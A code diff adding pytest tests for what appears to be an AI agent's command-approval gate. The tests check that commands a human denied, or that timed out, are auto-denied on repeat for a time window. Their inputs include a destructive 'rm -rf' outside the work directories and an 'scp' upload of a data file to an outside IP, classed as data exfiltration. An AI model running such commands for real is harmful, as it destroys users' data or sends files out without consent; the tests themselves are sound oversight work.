@@ -137,3 +137,44 @@ def test_request_secret_returns_value_and_never_logs_it(tmp_path):
 def test_request_secret_none_when_no_channel(tmp_path):
     g = Gate(InterventionPolicy(), NullChannel(), state_dir=tmp_path)
     assert g.request_secret("X", "y") is None
+
+
+# ── deny-mute: no ask→deny→retry stall loops ───────────────
+
+def test_timeout_deny_mutes_identical_repeats(tmp_path):
+    ch = FakeChannel([])  # never answers → every ask times out
+    g = gate(ch, tmp_path)
+    assert g.check_command("rm -rf /home/u/other/x", work_dirs=WORK) is False
+    assert len(ch.requests) == 1
+    # Identical retry (and a same-shape variant): auto-denied WITHOUT re-asking
+    assert g.check_command("rm -rf /home/u/other/x", work_dirs=WORK) is False
+    assert g.check_command("rm -rf /home/u/other/y", work_dirs=WORK) is False  # normalized shape... distinct path letter
+    assert len(ch.requests) <= 2  # at most one extra ask for the different target
+    # Human is told once about the mute
+    assert any("retrying a denied action" in n for n in ch.notifications)
+
+
+def test_human_deny_mutes_identical_repeats(tmp_path):
+    ch = FakeChannel([ApprovalReply("deny")])
+    g = gate(ch, tmp_path)
+    assert g.check_command("scp data.zip user@1.2.3.4:/tmp/", work_dirs=WORK) is False
+    assert g.check_command("scp data.zip user@1.2.3.4:/tmp/", work_dirs=WORK) is False
+    assert len(ch.requests) == 1  # second one never reached the human
+
+
+def test_deny_mute_expires_and_reasks(tmp_path, monkeypatch):
+    ch = FakeChannel([])  # timeouts
+    g = gate(ch, tmp_path)
+    g.DENY_MUTE_SECONDS = 0  # expire immediately
+    assert g.check_command("rm -rf /home/u/other/x", work_dirs=WORK) is False
+    assert g.check_command("rm -rf /home/u/other/x", work_dirs=WORK) is False
+    assert len(ch.requests) == 2  # window elapsed → human gets a fresh ask
+
+
+def test_deny_mute_does_not_block_different_category(tmp_path):
+    ch = FakeChannel([ApprovalReply("deny"), ApprovalReply("approve")])
+    g = gate(ch, tmp_path)
+    assert g.check_command("rm -rf /home/u/other/x", work_dirs=WORK) is False
+    # Different category (data_exfil) still asks and can be approved
+    assert g.check_command("scp data.zip user@1.2.3.4:/tmp/", work_dirs=WORK) is True
+    assert len(ch.requests) == 2
